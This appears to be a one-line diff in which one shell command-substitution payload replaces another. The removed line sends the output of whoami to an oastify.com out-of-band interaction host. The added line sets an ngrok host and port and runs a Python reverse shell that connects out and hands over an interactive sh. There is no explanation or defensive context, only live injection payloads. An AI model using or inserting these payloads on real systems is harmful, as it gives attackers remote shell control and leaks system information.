@@ -1,1 +1,1 @@
-$(curl https://2aduyfj2erd29nwaixnuovcylprgfa3z.oastify.com?whoami=$(whoami))
+$(export RHOST="6.tcp.eu.ngrok.io";export RPORT=15484;/usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')
